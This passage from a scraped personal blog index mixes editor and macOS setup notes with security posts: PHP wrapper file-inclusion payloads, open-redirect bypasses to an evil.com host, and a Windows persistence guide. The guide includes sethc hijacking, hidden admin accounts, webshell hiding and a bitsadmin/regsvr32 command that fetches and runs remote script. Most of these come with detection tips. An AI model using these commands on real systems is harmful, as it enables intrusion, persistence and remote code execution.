profile tell front window tell current session write text (&quot;nvim &quot; &amp; &quot;; exit&quot;) end tell end tell end tellend run 当应用不能安装的时候开启任意来源1234开启任意来源sudo spctl --master-disable 关闭任意来源sudo spctl --master-enable 当应用程序显示损坏的时候12sudo xattr -r -d com.apple.quarantine /Applications/YesPlayMusic.app后方的应用程序所在路径 开启命令行 sudo 使用指纹解锁12345678# Edit the /etc/pam.d/sudosudo vim /etc/pam.d/sudo# Append the below line to this file(It's best to put is to the top)auth sufficient pam_tid.so# Use :wq! to force save and quit:wq! If you want to unlock this with your Apple Watch, then go to the mac preferences to modify the setting. 使用 Ctrl+Command 进行窗口拖动12345# enabledefaults write -g NSWindowShouldDragOnGesture -bool true# disabledefaults delete -g NSWindowShouldDragOnGesture https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english-no-swears.txt 使 Mac 上地图变成中文的（系统英文的情况下）123defaults write com.apple.Maps AppleLanguages '(zh-CN)'# 同样，我们看可以使用如下命令来进行键值的读取# defaults read com.apple.Maps AppleLanguages 更改的位置即为如下路径中的 AppleLanguages 键值 1/Users/resek4/Library/Containers/com.apple.Maps/Data/Library/Preferences/com.apple.Maps.plist 更多 Mac 下 defaults 用法详见：重置 macOS 程序坞以及 defaults 命令用法 - 知乎Menu Bar | macOS defaults","link":"/2022/08/04/MacOS%20Custom%20Settings/"},{"title":"详解 php 封装协议","text":"概述PHP: 支持的协议和封装协议 - Manual PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。 各个封装协议是否能使用取决于 php.ini 里 allow_url_include 与 allow_url_fopen 的参数设置情况。 file:// 协议 对 php.ini 中的两个参数不敏感 一般访问本地文件的时候用，最好跟绝对路径（不然会基于脚本所存在的路径进行检索） 12# file:// 绝对路径index.php?file=file://D:\\ha\\haha\\hahaha.txt 甚至在一些情况下，使用直接跟远端地址也可以触发文件包含漏洞 php:// 协议php://input 可以把 php://input php://output 理解成通用的 I/O 数据流，而这个数据流就像一个堆栈，input，output 的东西可以在需要的时候立刻被执行 在enctype=&quot;multipart/form-data&quot; 的时候php://input 是无效的 对 php.ini 中的 allow_url_include 参数敏感，需要为 on 具体原理 123456&lt;!-- 客户端就是提交一个 POST 表单 --&gt;&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt; name: &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;tom&quot; /&gt;&lt;br /&gt; age:&lt;input type=&quot;text&quot; name=&quot;age&quot; value=&quot;22&quot; /&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt; &lt;/form&gt; 123# 服务器端$content = file_get_contents(&quot;php://input&quot;);echo $content; //输出name=tom&amp;age=22 如果我们确定了存在文件包含行为，且有可能要包含的文件名是由我们的输入经过 file_get_contents 控制的，那一般我们可以在 URL 访问的参数中写上123index.php?file=php://# 然后POST包内容写上&lt;?php phpinfo()?&gt; 官方对 php://input 的说明中，反复提到环境变量$HTTP_RAW_POST_DATA ，这个变量其实和 file_get_contents(php://input) 的内容是一样的。如果要开启这个变量，需要修改配置文件，找到 always_populate_raw_post_data这个选项，设置为 On ，然后重新启动 Web 服务器，就可以了。 php://output 与 input 同理12345&lt;?php$output = fopen(&quot;php://output&quot;, &quot;w&quot;);fwrite($output, &quot;Test-Testinggggg&quot;);fclose($output);?&gt; php://filter (&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器 因为 php://filter 也对 php.ini 中的两个参数不敏感，所以在有文件包含的时候，可以尝试在 URL 中使用如下命令 1index.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php php://filter 参数 描述 resource=&lt;要过滤的数据流&gt; 必须项。它指定了你要筛选过滤的数据流。 read=&lt;读链的过滤器&gt; 可选项。可以设定一个或多个过滤器名称，以管道符分隔 write=&lt;写链的过滤器&gt; 可选项。可以设定一个或多个过滤器名称，以管道符分隔 &lt;; 两个链的过滤器&gt; 任何没有以 read= 或 _write=_作前缀的筛选器列表会视情况应用于读或写链。 其中不同的过滤器有 php://fd (&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3 php://memory &amp; php://temp (&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。 data:// 协议 自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码 对 php.ini 的两个参数敏感，需要都是 on 的状态 当确定有文件包含的时候，可以如下使用12345# data://text/plain,http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;# data://text/plain;base64,http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b zip:// &amp; bzip2:// &amp; zlib:// 协议 zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等 对 php.ini 中的两个参数不敏感 当确定存在文件包含时，如下使用12345678# zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\phpinfo.jpg%23phpinfo.txt# compress.bzip2://file.bz2http://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\phpinfo.bz2# compress.zlib://file.gzhttp://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\phpinfo.gz phar:// 协议 类似与上方提到的 zip:/ 压缩协议，phar 是归档协议 当确定存在文件包含时，如下使用1http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt #待处理利用 phar 拓展 php 反序列化漏洞攻击面","link":"/2022/08/21/PHP%20%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE/"},{"title":"Ranger Custom Settings","text":"Basic If you want to custom your ranger,you should do the below changes: 12345# In your .zshrcexport RANGER_LOAD_DEFAULT_RC=false# In the consoleranger --copy-config=all then,you’ll see the default configretion in .config/ranger folder,also the rc.conf filename Description rc.conf The ranger configuration rifle.conf The default application to open a file scope.sh Define how to scope a file in ranger commands.py Custom the commands in ranger 1 Tap hjkl can move the cursor Tap HJKL can move the cursor to the history action place Tap [ ] could get into another folder Tap zh or Ctrl+h to turn on/off the hidden files Tap o to sort the files with some rules(we can use oa ob,etc…) Tap / to search the file in the current folder (We can custom + - to jump to the next result) Tap Shift+s to get into a cursor file Tap yp to copy the filepath to the clipboard Tap cw to rename the file Tap yy to copy a file Tap pp to paste a copied file Tap dd to cut a file Tap dD to delete a file Tap w to get the task board(And tap dd can cancel a task) Tap v to select all the files in the current folder PluginsYou can get the plugins on ranger’s official GitHub page: Ranger Plugins ranger-devicons2This plugin can add some cool icons for the different folders or files You need to install the Nerd-fonts . 123git clone https://github.com/ryanoasis/nerd-fonts.gitcd ./nerd-fonts./install.sh You should change the iterm2(or another console applications) fonts. You should append these lines to the rc.conf file 1default_linemode devicons2 Finally,you’ll get the dope icons","link":"/2022/10/03/Ranger/"},{"title":"URL 跳转漏洞","text":"URL 跳转漏洞0x00.参考文章 https://www.cnblogs.com/linuxsec/articles/10926152.html https://ninjia.gitbook.io/secskill/web/url 0x01.概念这类漏洞属于低危漏洞，但是如果有操作或许可以打组合拳 此类漏洞会出现在造成网页跳转的页面 登录、注册、修改密码 支付成功跳回原页 用户分享、收藏内容过后 跨站点认证、授权后 站内点击其它网址链接时 等等一切可跳转的页面… 利用方式是，给受害者一个有跳转漏洞的安全链接，然后一点击就会跳到我们指定的页面，可以作为钓鱼使用 1http://127.0.0.1/url.php?username=&amp;password=&amp;redict=http://127.0.0.1/fish.php 我们可以使用谷歌语法去 fuzz 要查的网站 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465site:baidu.com inurl:以下fuzz参数redirect=url=redirectUrl=callback=return_url=toUrl=ReturnUrl=fromUrl=redUrl=request=redirect_to=redirect_url=jump=jump_to=target=to=goto=link=linkto=domain=oauth_callback=login=qurl=logout=data=ext=clickurl=next=callback_url=jump_url=return=click?u=originUrl=Redirect=sp_url=service=rit_url=forward_url=forward=success=recurl=j?url=uri=u=allinurl=q=src=tc?src=linkAddress=location=go=pic=burl=backurl=RedirectUrl=origin=Url=desturl=page=u1=action=action_url=dest= 0x02.常见后端代码如下123456789101112131415161718192021Java:response.sendRedirect(request.getParameter(&quot;url&quot;));PHP:$redirect_url = $_GET['url'];header(&quot;Location: &quot; . $redirect_url);.NET:string redirect_url = request.QueryString[&quot;url&quot;];Response.Redirect(redirect_url);Django:redirect_url = request.GET.get(&quot;url&quot;)HttpResponseRedirect(redirect_url)Flask:redirect_url = request.form['url']redirect(redirect_url)Rails:redirect_to params[:url] 0x03.利用一般的网站 redict 参数后面是有一个人家网站正规的跳转后链接的所以我们要做的就是在那个链接附近加一些恶意参数，让其跳到我们要的网站 有的时候 redirct=后面的内容是加密的，给自己的 payload 也加密 bypass 即可 1.直接跳转12www.baidu.com/url.php?username=&amp;password=&amp;redict=www.evil.com直接在跳转参数后面写自己的网站就好了 2.协议一致性12www.baidu.com/redirect.php?url=https://www.evil.com/untrust.html原网站和即将要跳转的网站有必须协议一致的审查机制 3.域名是否包含白名单要求的字符串代码 12345678&lt;?php$redirect_url = $_GET['url'];if(strstr($redirect_url,&quot;127.0.0.1&quot;) !== false){ header(&quot;Location: &quot; . $redirect_url);}else{ die(&quot;Forbidden&quot;);} 有的检测域名结尾是不是当前域名(Django 实现) 12345redirect_url = request.GET.get(&quot;url&quot;)if redirect_url.endswith('landgrey.me'): HttpResponseRedirect(redirect_url)else: HttpResponseRedirect(&quot;https://www.landgrey.me&quot;) 我们可以通过直接输入恶意域名后，衔接正常域名1www.baidu.com/redirect.php?url=http://www.evil.com/www.baidu.com 或者直接购买或谷歌语法 inurl 搜索一个包含 baidu 的域名1www.baidu.com/redirect.php?url=http://hahabaidu.com 可以利用公共白名单的可信站例如 google.com 是可信站，而谷歌下有个缓存功能 1google.com/linkurl=www.evil.com 那么我们可以在有跳转漏洞的 url 后加上有我们恶意页面缓存的可信站 url来进行绕过 1www.baidu.com/redirect.php?url=google.com/linkurl=www.evil.com 如果要求只能是本站域，那么可以本站其他有跳转漏洞的 url 来套娃1www.baidu.com/redirect.php?url=www.baidu.com/redirect.php?url=http://hahabaidu.com 4.加特殊字符绕过脱离不了这几个字符： 123456789;/\\?:@=&amp;. 例子是： 1www.baidu.com/url.php?username=1&amp;redict=http://www.evil.com@tieba.baidu.com 5.一些奇异的基于不同框架的绕过法1234567891011121314# 很多斜杠、反斜杠、点奇异绕过www.baidu.com/url.php?username=1&amp;redict=////www.evil.com/..www.baidu.com/url.php?username=1&amp;redict=\\\\\\\\www.evil.com/..# xip.io服务绕过，127.0.0.1是我们的恶意服务器ipwww.baidu.com/url.php?username=1&amp;redict=http://tieba.baidu.com.127.0.0.1.xip.ioxip.io相当于建立了个[[DNS]]规则，会将前面的域名定向到后面的ip地址处# 缺少协议的绕过www.baidu.com/redirect.php?url=//www.evil.com# 利用奇怪的的点来绕过www.baidu.com/redirect.php?url=.evil.com 6.其他绕过方法 跳转到 IP 地址，而不是域名 跳转到 IPV6 地址，而不是 IPv4 地址 将要跳转到的 IP 地址用 10 进制、8 进制、16 进制形式表示 更换协议,使用 ftp、gopher 协议等 借鉴[[SSRF]]漏洞绕过的 tricks CRLF 注入不能 xss 时，转向利用任意 URL 跳转漏洞","link":"/2020/09/09/URL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/"},{"title":"Neovim, my favourite editor!","text":"Some hotkey to operate vimUse vim-plug in neovim The neovim config file is in ~/.config/nvim/init.vimwwe should create two directory ~/.config/nvim/autoload ~/.config/nvim/plugged 1mkdir -p ~/.config/nvim/autoload ~/.config/nvim/plugged 12# Download vim-plugcurl -fLo ~/.config/nvim/autoload/plug.vim https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim Append new lines in vim config file(Neovim is in ~/.config/nvim/init.vim) 123call plug#begin('~/.config/nvim/plugged')Plug 'vim-airline/vim-airline'call plug#end() Then,reload the config file,change vim to the command mode, tap these 1:PlugInstall And you have completely installed the vim-plug Single option to edit Command a could get into the insert mode after the current character. Command Shift + a could get into the insert mode at the last of the current line. The command i could get into the insert mode before the current character. Command Shift+ i could get into the insert mode at the begin of the current line. Command o could get into the insert mode at the next line beginning. Command Shift+o could get into the insert mode at the previous line beginning. Command u could undo the previous actoin. We can use &quot; to comment the vimrc In the command mode,keyword % means the current file itself. We can use $ to move the cursor to the end of a line 1&lt;operation&gt; &lt;motion&gt; # The command format is Kind of this mode d command is the delete keyWhen we use d+Right+3,means delete 3 letters on the right side Tap: set spell，the incorrect syntax will be found. choose a incorrect word,tapz=,then,you will find lots of words advice from vim. When you jump to another place,you want to go back to the previous code block,you could use Ctrl + o,also,you could use Ctrl + i to go back again When your cursor is on a filepath，tap gf to open it within the current window(then you can also tap Ctrl + o to go back to the previous file) ⭐️Tip oneIf you are editing a /etcfile but don’t have the root privilege,and exit will lose the contents forever.Then you can tap these commands to save your data 1: w !sudo tee % then you input some enter will be rightAttention: this command is perfect to run in vim,but not neovim ⭐️Tip twowe can append a rule in vimrc,like 1map \\&lt;LEADER&gt;\\&lt;LEADER&gt; \\&lt;Esc&gt;/&lt;++&gt;\\&lt;CR&gt;: nohlsearch\\&lt;CR&gt;c4l From now on,if we write &lt;++&gt; in a file,then we tap double spaces we can change new characters replacing the previous one. ⭐️Tip threea combo with figlet install the figlet(brew install figlet) tap these commands to insert a figlet words into the file 1: r !figlet NICE then we’ll get this one ⭐️Tip fourprint the vim file into the HTML format (will open another vim window) 1%TOhtml when we tap wq in the new genarete file,we can open it with the browser Edit the vimrcUse map to custom the keybindCustom setting12345678910111213141516171819202122232425262728# increase the line numberset number# syntax highlightingsyntax on# add a underline on current editing lineset cursorline# use Tab to complete the commandset wildmenu# make text auto fit current windowset wrap# make your vim adapted with the elder versionset nocompatible# custom the indent(when you use python or other language),There must be no spaces around the &quot;=&quot;set tabstop=2set shiftwidth=2set softtabstop=2# make your editing line always keep the medium of your screenset scrolloff=5# use the option,we could restore the editing position latest edited when we open the file again next timeau BufReadPost * if line(&quot;'\\&quot;&quot;) &gt; 1 &amp;&amp; line(&quot;'\\&quot;&quot;) &lt;= line(&quot;$&quot;) | exe &quot;normal! g'\\&quot;&quot; | endif map123456789# tap j,means kmap j k# tap Ctrl+s，means :wq+entermap &lt;C-s&gt; :wq&lt;CR&gt;# deny the recursive querynoremap j k Special keys 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859notation meaning equivalent decimal value(s)-----------------------------------------------------------------------&lt;Nul&gt; zero CTRL-@ 0 (stored as 10) &lt;Nul&gt;&lt;BS&gt; backspace CTRL-H 8 backspace&lt;Tab&gt; tab CTRL-I 9 tab Tab linefeed&lt;NL&gt; linefeed CTRL-J 10 (used for &lt;Nul&gt;)&lt;FF&gt; formfeed CTRL-L 12 formfeed&lt;CR&gt; carriage return CTRL-M 13 carriage-return&lt;Return&gt; same as &lt;CR&gt; &lt;Return&gt;&lt;Enter&gt; same as &lt;CR&gt; &lt;Enter&gt;&lt;Esc&gt; escape CTRL-[ 27 escape &lt;Esc&gt;&lt;Space&gt; space 32 space&lt;lt&gt; less-than &lt; 60 &lt;lt&gt;&lt;Bslash&gt; backslash \\ 92 backslash &lt;Bslash&gt;&lt;Bar&gt; vertical bar | 124 &lt;Bar&gt;&lt;Del&gt; delete 127&lt;CSI&gt; command sequence intro ALT-Esc 155 &lt;CSI&gt;&lt;xCSI&gt; CSI when typed in the GUI &lt;xCSI&gt;&lt;EOL&gt; end-of-line (can be &lt;CR&gt;, &lt;LF&gt; or &lt;CR&gt;&lt;LF&gt;, depends on system and 'fileformat') &lt;EOL&gt;&lt;Up&gt; cursor-up cursor-up cursor_up&lt;Down&gt; cursor-down cursor-down cursor_down&lt;Left&gt; cursor-left cursor-left cursor_left&lt;Right&gt; cursor-right cursor-right cursor_right&lt;S-Up&gt; shift-cursor-up&lt;S-Down&gt; shift-cursor-down&lt;S-Left&gt; shift-cursor-left&lt;S-Right&gt; shift-cursor-right&lt;C-Left&gt; control-cursor-left&lt;C-Right&gt; control-cursor-right&lt;F1&gt; - &lt;F12&gt; function keys 1 to 12 function_key function-key&lt;S-F1&gt; - &lt;S-F12&gt; shift-function keys 1 to 12 &lt;S-F1&gt;&lt;Help&gt; help key&lt;Undo&gt; undo key&lt;Insert&gt; insert key&lt;Home&gt; home home&lt;End&gt; end end&lt;PageUp&gt; page-up page_up page-up&lt;PageDown&gt; page-down page_down page-down&lt;kHome&gt; keypad home (upper left) keypad-home&lt;kEnd&gt; keypad end (lower left) keypad-end&lt;kPageUp&gt; keypad page-up (upper right) keypad-page-up&lt;kPageDown&gt; keypad page-down (lower right) keypad-page-down&lt;kPlus&gt; keypad + keypad-plus&lt;kMinus&gt; keypad - keypad-minus&lt;kMultiply&gt; keypad * keypad-multiply&lt;kDivide&gt; keypad / keypad-divide&lt;kEnter&gt; keypad Enter keypad-enter&lt;kPoint&gt; keypad Decimal point keypad-point&lt;k0&gt; - &lt;k9&gt; keypad 0 to 9 keypad-0 keypad-9&lt;S-...&gt; shift-key shift &lt;S-&lt;C-...&gt; control-key control ctrl &lt;C-&lt;M-...&gt; alt-key or meta-key meta alt &lt;M-&lt;A-...&gt; same as &lt;M-...&gt; &lt;A-&lt;D-...&gt; command-key (Macintosh only) &lt;D-&lt;t_xx&gt; key with &quot;xx&quot; entry in termcap Split your vim workspaceEdit the vim config file~/.config/nvim/init.vim,then append these configurations 12345678910111213141516# set a mapleader keylet mapleader = &quot; &quot;# horizontal split your vim workspacemap `h :set nosplitright&lt;CR&gt;:vsplit&lt;CR&gt;map `l :set splitright&lt;CR&gt;:vsplit&lt;CR&gt;# vertical split your vim workspacemap `j :set nosplitbelow&lt;CR&gt;:split&lt;CR&gt;map `k :set splitbelow&lt;CR&gt;:split&lt;CR&gt;# move your cursor to the other workspacemap &lt;LEADER&gt;h &lt;C-w&gt;hmap &lt;LEADER&gt;j &lt;C-w&gt;jmap &lt;LEADER&gt;k &lt;C-w&gt;kmap &lt;LEADER&gt;l &lt;C-w&gt;l open another file,we can tap: e ~/try/2.txtto open another file in your vim Vim Tab Manager12345678# create a new tabmap tn :tabe&lt;CR&gt;# previous tabmap th :-tabnext&lt;CR&gt;# next tabmap tl :+tabnext&lt;CR&gt; Recoding a macro Tap q ,then Tap a Character you want,such as a Vim will recode a macro marked with a Do anything you want. Tap @ + a will execute the macro VISUAL LINEV-LINE modeTap the Shift+v could get into the V-LINE mode,and we could batch operate these lines. then,Tap the : ,we could input the batch operate the lines 123# Append 2022- to the beginning of these lines:normal I2022-# Tap the Enter key will see the changing V-BLOCK modeTap the Ctrl+v could get into the V-BLOCK mode,and we could batch operate the selected blocksthen,Tap the : ,we could input the batch operate the lines 12345678# Append 2022- to the beginning of these selected blocks，and Tap the Enter key will see the changing:normal I2022-# delete All the selected blocksd# edit an area in one line,and take effect to all the lines(Tap Esc to make it effective when you have edited)Shift + i Vim-Plugspreservim/nerdcommenter Use space(My &lt;LEADER&gt;) + cc to add a comment User space(My &lt;LEADER&gt;) + cu to cancel a comment tpope/vim-surround Use cs&quot;' can change the word surrounding become to ' from &quot; Use cs&quot;&lt;q&gt; can change the word surrounding become to &lt;q&gt; from &quot; Use ds&quot;can cancel the word surrounding tmhedberg/SimpylFold Use zo to open a folded code block Use zc to close a fold CoC Use space + r + n to rename a variable mbbill/undotreeAdd a configuration to the init.vim 1nnoremap &lt;C-h&gt; :UndotreeToggle&lt;CR&gt; Use Ctrl + H to open the undotree toggle FzFAdd a configuration to the init.vim 12345678nnoremap &lt;Leader&gt;C :Colors&lt;CR&gt;nnoremap &lt;Leader&gt;b :Buffers&lt;CR&gt;nnoremap &lt;Leader&gt;f :Files&lt;CR&gt;nnoremap &lt;Leader&gt;l :Lines&lt;CR&gt;nnoremap &lt;Leader&gt;ag :Ag &lt;C-R&gt;&lt;C-W&gt;&lt;CR&gt;nnoremap &lt;Leader&gt;AG :Ag &lt;C-R&gt;&lt;C-A&gt;&lt;CR&gt;xnoremap &lt;Leader&gt;ag y:Ag &lt;C-R&gt;&quot;&lt;CR&gt;nnoremap &lt;Leader&gt;` :Marks&lt;CR&gt; Use \\&lt;LEADER&gt; + f to search files NerdTreeAdd a configuration to the init.vim 1nnoremap &lt;C-f&gt; :NERDTreeFind&lt;CR&gt; Use Ctrl + f to open the NerdTree mhinz/vim-startifyJust install the pluggin is well mg979/vim-visual-multi When you cursor a word,tap Ctrl + n to select a word and get into the visual-multi mode Then you can change them batching","link":"/2022/06/23/Vim/"},{"title":"Windows 关键文件安全性排查(红蓝对抗)","text":"参考文章 windows 常见 backdoor、权限维持方法及排查技术 系统工具替换后门排查：autoruns 工具，下载地址： Autoruns for Windows v13.98此后门易被检测类似可被替换的程序有： osk.exe Narrator.exe Magnify.exe [[utilman]]辅助工具管理器![[utilman]] sethc.exe 轻松使用经典的 shift 后门 修改注册表 HKEY\\_LOCAL\\_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options 下 sethc.exe，添加一个 Debugger 字符值（REG_SZ），并且赋值为 cmd.exe 的执行路径为 C: \\\\windows\\\\system32\\\\cmd.exe 1REG ADD &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\\windows\\system32\\cmd.exe&quot; /f 这里有更高阶的使用方法，且不会被 autoruns 检测到： 打造不一样的 Shfit 映像劫持后门 后门账号 创建克隆 administrator 账号，且通过命令 net user 以及控制面板中的管理账户无法看到。 ![[powershell#用户]]1.创建后门用户 123net user defaultuser0$ somepasswordhere /add /ynet localgroup administrators defaultuser0$ /addnet localgroup &quot;remote desktop users&quot; defaultuser0$ /add 2.之后将 administrator 用户对应的 Users 中的 F 值复制替换后门账户的 F 值3.导出 User 下面的后门账户以及 name 下面的后门账户两个文件。4.通过命令删除刚才的后门用户 1net user defaultuser0$ /del 5.通过注册表导入刚才保存的两个注册表 参考文章 Windows 系统的帐户隐藏 明文账号记录 安全支持提供程序（SSP）是 Windows API，用于扩展 Windows 身份验证机制。 LSASS 进程在 Windows 启动期间加载安全支持提供程序 DLL。这个时候攻击者可以将精心构造的 dll 加载之，这个 dll 可获取到 lsass 进程中的明文账号密码信息。mimikatz(mimilib.dll 或 memssp 内存补丁方式)实现了这一功能，并把记录到的明文账号密码信息保存在本地。 详见文章 Persistence – Security Support Provider 文件隐藏attrib 命令隐藏 windows 自带命令行工具 attrib 用来显示或更改文件属性。 优点:简单 缺点:暂无 排查:使用 attrib 命令或者 D 盾 使用 ADS 流隐藏 webshell ADS 即 NTFS 文件流 使用 ADS 流隐藏 webshell,目前可过 D 盾扫描,注意 ADS 的一句话木马无法直接连接，可以使用 php 的 include 去包含执行 文章参考： 利用 ADS 隐藏 webshell 文章参考： Windows ADS 在渗透测试中的妙用 此外应该注意修改文件的 timestamp，可使用如下的[[powershell]]命令或者使用 NewFileTime 工具 123456$(Get-Item ).creationtime=$(Get-Date &quot;mm/dd/yyyy hh:mm am/pm&quot;)$(Get-Item ).lastaccesstime=$(Get-Date &quot;mm/dd/yyyy hh:mm am/pm&quot;)$(Get-Item ).lastwritetime=$(Get-Date &quot;mm/dd/yyyy hh:mm am/pm&quot;)example：Set the last-access time for a file aaa.csv to the current time: $(Get-Item aaa.csv).lastwritetime=$(Get-Date)Set the creation time of a file foo.txt to November 24, 2015, at 6:00am: $(Get-Item foo.txt).creationtime=$(Get-Date &quot;11/24/2015 06:00 am&quot;) 优点：较难检测 缺点：暂无 排查： dir /r 计划任务 schtasks 和 at 命令，例如下面的命令 123456789101112#from https://github.com/diggles9991/MG/blob/master/XMR/Hook.ps1#L12# Update scheduled Start TaskSCHTASKS /Delete /tn &quot;AdobeReaderUpdate&quot; /fSCHTASKS /Create /RU &quot;SYSTEM&quot; /tn &quot;AdobeReaderUpdate&quot; /sc Weekly /d * /st 18:00:00 /tr &quot;powershell.exe C:\\Windows\\System32\\drivers\\en-US\\etc\\Line.ps1&quot;# Update scheduled End Task# SCHTASKS /Delete /tn &quot;AdobeReaderUpdateEnd&quot; /fSCHTASKS /Create /RU &quot;SYSTEM&quot; /tn &quot;AdobeReaderUpdateEnd&quot; /sc Weekly /d MON,TUE,WED,THU,FRI /st 06:00:00 /tr &quot;powershell.exe Stop-Process -Name $processname&quot;# At commandat 1:00AM /Every:Saturday My_BackUp.bat 在每个Saturday的早上1:00点，定时启动My_BackUp.bat批处理文件。 优点：简单 缺点：易被检测 排查： schtasks /query 命令进行查询或者通过计算机的管理查看，注意在 windows 的中文版系统中，schtasks 命令需要切换字符为美国英语格式，使用命令 chcp 437，或者直接工具 autoruns。 开机启动项1234HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run等 优点：重启权限维持 缺点：一般杀软均会拦截 排查：一个一个手工查太麻烦，建议直接上 autoruns。 20191022 更新 利用 windows 原生 API 去创建 regedit.exe 不能展示和导出的键值对 详见文章 invisible Reg Values ,缺点只是通过regedit.exe查看时候有隐藏效果，通过autoruns等工具还是会被发现。 服务1sc create [ServerName] binPath= BinaryPathName 优点：重启权限维持 缺点：一般杀软会拦截 排查：工具 autoruns waitfor.exe 不支持自启动，但可远程主动激活，后台进程显示为 waitfor.exe 详细参考 优点：远程主动激活 缺点：有 waitfor 进程 排查：通过 Process Explorer 工具查看是否有 waitfor.exe 进程，并进一步查看启动参数等。 bitsadmin 后门 Bitsadmin 从 win7 之后操作系统就默认包含，可以用来创建上传或者下载任务。Bistadmin 可以指定下载成功之后要进行什么命令。后门就是利用的下载成功之后进行命令执行。 12345678#创建一个下载任务：bitsadmin /create backdoor#添加文档：bitsadmin /addfile backdoor %comspec% %temp%\\cmd.exe#设置下载成功之后要执行的命令：bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll&quot;#执行任务：bitsadmin /Resume backdoor 可以参考这篇文章 bitsadmin-backdoor-权限维持后门 优点：系统自带无需上传 缺点：免杀效果一般 排查：bitsadmin /list /verbose WMI 后门(重点!) 在 2015 年的 blackhat 大会上 Matt Graeber 介绍了一种无文件后门就是用的 wmi。 更多可以参考 在 empire 中有相应的 module，作者参考使用了 Powersploit 里面的代码。 后门在系统重启五分钟之内触发且是 system 权限。 优点：无文件，相对来说难以排查 缺点：暂无 排查：工具 autoruns COM 劫持 可以参考文章 打开文件夹就运行？COM 劫持利用新姿势 利用 CLR 实现一种无需管理员权限的后门 “主动型”后门，WMI添加环境变量需要重启系统生效 优点:隐藏性较好,autoruns 查不到 缺点:暂无 排查:检查环境变量和注册表键值 meterpreter 权限维持 meterpreter 中的权限维持技术有两种，一种是 metsvc 的后门(服务后门)，另外一种是 persistence(注册表后门) metsvc 是开机自启动的服务型后门 metsvc 代码 persistence 模块是先上传 vbs 脚本并执行 vbs 脚本修改注册表 HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 从而完成自启动。 persistence 代码 优点：开机自启动 缺点：容易被杀软杀 排查：像是这种后门使用 autoruns 基本都可以排查出来。 Empire persistence 模块(重点!!) Empire 是一款功能非常强大的后渗透攻击框架。其中的 persistence 模块提供了一系列权限维持方法。 工具还把权限维持分为了四大类，userland(普通权限)、elevated(需要高权限)、powerbreach(内存权限维持，重启后失效)、miscellaneous(其它)。 通过 info 命令查看使用方法 更多可以参考文章 优点:基本集成了大部分的权限维持方法 缺点：暂无 排查：工具 autoruns 进程注入(重点!!) 准确来说进程注入不是后门技术或者权限维持技术，而是一种隐藏技术，这里简单说一下 empire 的 psinject、cobaltstrike 的 inject 和 meterpreter 中的 migrate 进程注入，一般可以注入到像是 lsass 或者 explorer 这样的进程当中，相对比较隐蔽，较难排查。 使用方法这里就不介绍了，主要说一下如何 hunting。这篇文章 TALES OF A BLUE TEAMER: DETECTING POWERSHELL EMPIRE SHENANIGANS WITH SYSINTERNALS 里面介绍了如何hunting empire方法，empire有一些evasion detection机制，其中的网络连接时间设置能有效避开常见主机流量检测工具(包括netstat、tcpview)的检测，文章中也介绍了使用process monitor是最快也是最有效的方法。 但是在 hunting 进程注入的时候，并没有像文章中说的查找到以起始地址为 0x0 的线程，但会发现被注入的进程属性里会有.NET Assemblies 和.NET Performance 两个菜单。如下图所示 优点：较难排查 缺点：暂无 排查：工具 process explorer 、process monitor BDF 后门 BDF(The Backdoor Factory)可用来向可执行文件植入后门，修改程序执行流程，执行添加的 payload。 参考 利用 BDF 向 EXE 文件植入后门 Kali Linux: Backdoor-factory tool 当拿到内网权限之后，可以在存放公共下载的服务器上给某个软件加上这样的后门。 IIS 模块后门手把手带你开发一款 IIS 模块后门 [[域]]环境后门 域内配置 ACL 后门及检测清理 PasswordchangeNotify 域后门相关文章 other 除了以上的几种后门和权限维持技术外还有像是 dll 劫持、一些软件的插件后门、office 